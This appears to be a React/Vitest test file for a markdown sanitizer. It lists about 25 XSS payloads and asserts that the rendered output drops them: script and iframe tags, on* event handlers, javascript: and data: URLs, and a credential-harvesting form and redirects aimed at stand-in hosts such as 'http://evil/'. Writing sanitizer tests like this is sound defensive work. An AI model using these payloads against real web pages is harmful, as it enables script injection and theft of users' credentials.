import { describe, expect, it } from "vitest";
import { render } from "@testing-library/react";
import { SafeMarkdown } from "../SafeMarkdown";

/**
 * XSS payload suite — see {@link SafeMarkdown}. Each case asserts the
 * rendered DOM contains none of the dangerous sinks:
 *
 *   - <script> / <iframe> / <object> / <embed> / <style> / <form>
 *   - on* event-handler attributes
 *   - javascript: / data: / vbscript: / file: URLs in href or src
 *
 * Aim: defence in depth. CSP at nginx is the last layer; this is the
 * first.
 */
describe("SafeMarkdown — XSS payload suite", () => {
    const PAYLOADS: { name: string; markdown: string }[] = [
        {
            name: "raw <script> block",
            markdown: "<script>alert(1)</script>",
        },
        {
            name: "script with arbitrary attribute order",
            markdown: "<script type='text/javascript' src='evil.js'></script>",
        },
        {
            name: "<iframe> sandbox escape attempt",
            markdown: "<iframe src='https://evil.example/'></iframe>",
        },
        {
            name: "<iframe srcdoc>",
            markdown: "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        },
        {
            name: "<object data>",
            markdown: "<object data='javascript:alert(1)'></object>",
        },
        {
            name: "<embed src>",
            markdown: "<embed src='evil.swf' type='application/x-shockwave-flash'>",
        },
        {
            name: "<style> CSS injection",
            markdown: "<style>body { background: url('javascript:alert(1)') }</style>",
        },
        {
            name: "onerror on img tag",
            markdown: "![oops](http://example.com/x.png 'onerror=alert(1)')",
        },
        {
            name: "raw img with onerror attribute",
            markdown: "<img src='x' onerror='alert(1)'>",
        },
        {
            name: "onclick on anchor",
            markdown: "<a href='#' onclick='alert(1)'>click</a>",
        },
        {
            name: "onmouseover on span",
            markdown: "<span onmouseover='alert(1)'>hover</span>",
        },
        {
            name: "javascript: scheme on anchor",
            markdown: "[click](javascript:alert(1))",
        },
        {
            name: "JaVaScRiPt: case-mixed scheme",
            markdown: "[click](JaVaScRiPt:alert(1))",
        },
        {
            name: "data: URI on anchor",
            markdown: "[click](data:text/html,<script>alert(1)</script>)",
        },
        {
            name: "vbscript: scheme",
            markdown: "[click](vbscript:msgbox('xss'))",
        },
        {
            name: "file: scheme on img",
            markdown: "<img src='file:///etc/passwd'>",
        },
        {
            name: "<form> + <input> for credential harvest",
            markdown: "<form action='http://evil/'><input name='pw'></form>",
        },
        {
            name: "<meta http-equiv refresh>",
            markdown: "<meta http-equiv='refresh' content='0;url=http://evil/'>",
        },
        {
            name: "<link rel=stylesheet> exfil",
            markdown: "<link rel='stylesheet' href='http://evil/x.css'>",
        },
        {
            name: "<base href hijack>",
            markdown: "<base href='http://evil/'>",
        },
        {
            name: "SVG <script>",
            markdown: "<svg><script>alert(1)</script></svg>",
        },
        {
            name: "SVG onload",
            markdown: "<svg onload='alert(1)'></svg>",
        },
        {
            name: "encoded javascript: scheme",
            markdown: "[click](&#106;avascript:alert(1))",
        },
        {
            name: "unicode-escaped javascript:",
            markdown: "[click](\\u006Aavascript:alert(1))",
        },
        {
            name: "nested malicious comment",
            markdown: "<!-- <script>alert(1)</script> -->",
        },
    ];

    it.each(PAYLOADS)("sanitizes $name", ({ markdown }) => {
        const { container } = render(<SafeMarkdown source={markdown} />);
        const html = container.innerHTML;

        // No executable elements should make it through.
        expect(container.querySelectorAll("script")).toHaveLength(0);
        expect(container.querySelectorAll("iframe")).toHaveLength(0);
        expect(container.querySelectorAll("object")).toHaveLength(0);
        expect(container.querySelectorAll("embed")).toHaveLength(0);
        expect(container.querySelectorAll("style")).toHaveLength(0);
        expect(container.querySelectorAll("form")).toHaveLength(0);
        expect(container.querySelectorAll("meta")).toHaveLength(0);
        expect(container.querySelectorAll("link")).toHaveLength(0);
        expect(container.querySelectorAll("base")).toHaveLength(0);

        // No on* attributes.
        const allElements = container.querySelectorAll("*");
        for (const el of Array.from(allElements)) {
            for (const attr of Array.from(el.attributes)) {
                expect(attr.name.toLowerCase().startsWith("on")).toBe(false);
            }
        }

        // Verify dangerous URL schemes don't survive in href or src.
        const links = container.querySelectorAll("a[href]");
        for (const link of Array.from(links)) {
            const href = (link.getAttribute("href") ?? "").toLowerCase();
            expect(href.startsWith("javascript:")).toBe(false);
            expect(href.startsWith("vbscript:")).toBe(false);
            expect(href.startsWith("data:")).toBe(false);
            expect(href.startsWith("file:")).toBe(false);
        }
        const imgs = container.querySelectorAll("img[src]");
        for (const img of Array.from(imgs)) {
            const src = (img.getAttribute("src") ?? "").toLowerCase();
            expect(src.startsWith("javascript:")).toBe(false);
            expect(src.startsWith("vbscript:")).toBe(false);
            expect(src.startsWith("file:")).toBe(false);
        }

        // Sanity: alert(1) string may survive as plain text in the rendered
        // node (it shouldn't *execute*). Make sure no <script> or on*
        // attribute exists.
        expect(html.toLowerCase()).not.toMatch(/<script[\s>]/i);
        expect(html.toLowerCase()).not.toMatch(/\son\w+\s*=/i);
    });

    it("renders safe markdown unchanged", () => {
        const { container } = render(
            <SafeMarkdown source="## Title\n\n- bullet **bold** _italic_\n\n[ok](https://example.com)" />,
        );
        expect(container.querySelector("h2")).not.toBeNull();
        expect(container.querySelectorAll("script")).toHaveLength(0);
        const link = container.querySelector("a[href]");
        expect(link?.getAttribute("href")).toBe("https://example.com");
    });

    it("renders nothing for empty input", () => {
        const { container } = render(<SafeMarkdown source="" />);
        expect(container.querySelector("[data-testid='safe-markdown']")).toBeNull();
    });

    it("renders nothing for whitespace-only input", () => {
        const { container } = render(<SafeMarkdown source={"   \n\t  "} />);
        expect(container.querySelector("[data-testid='safe-markdown']")).toBeNull();
    });
});
